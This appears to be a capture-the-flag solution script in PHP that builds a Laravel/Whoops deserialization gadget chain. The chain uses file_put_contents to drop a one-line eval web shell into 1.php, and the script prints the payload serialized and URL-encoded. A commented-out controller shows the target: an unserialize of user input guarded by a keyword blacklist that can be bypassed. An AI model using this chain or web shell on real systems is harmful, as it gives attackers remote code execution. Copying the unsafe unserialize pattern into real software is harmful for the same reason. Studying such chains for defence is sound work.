<?php
namespace Illuminate\Routing
{
    class PendingResourceRegistration
    {
        protected $registrar;
        public function __construct($registrar)
        {
            $this->registrar = $registrar;
        }
    }
}

namespace Whoops\Handler
{

    abstract class Handler
    {
        private $run =null;
        private $inspector = '<?php @eval($_POST[1]); ?>';
        private $exception = '1.php';

    }
    class CallbackHandler extends Handler{
        protected $callable;

        public function __construct($callable)
        {
            $this->callable = $callable;
        }
    }
}

namespace Illuminate\View
{
    class InvokableComponentVariable
    {
        protected $callable;
        public function __construct()
        {
            $obj = new \Whoops\Handler\CallbackHandler('file_put_contents');
            $this->callable = [$obj,'handle'];

        }
    }
}
namespace {
    $a=new Illuminate\View\InvokableComponentVariable();
    $c = new Illuminate\Routing\PendingResourceRegistration($a,null);
    echo serialize($c);
    echo "\n";
    echo urlencode(serialize($c));
}


//namespace App\Http\Controllers;
//
//use Illuminate\Http\Request;
//
//class CTFController extends Controller
//{
//    public function ctf(Request $request)
//    {
//        if ($request->query("data") && \strlen($request->query("data")) < 1000) {
//            if (!preg_match("/first|Validator|PendingCommand|LazyOption|EvalLoader|Generator|PendingBroadcast|Queue|Cookie/i", $request->query("data"))) {
//                unserialize($request->query("data"));
//            } else {
//                return "error";
//            }
//        } else {
//            highlight_file(__FILE__);
//            return "Laravel version: " . app()::VERSION;
//        }
//    }
//}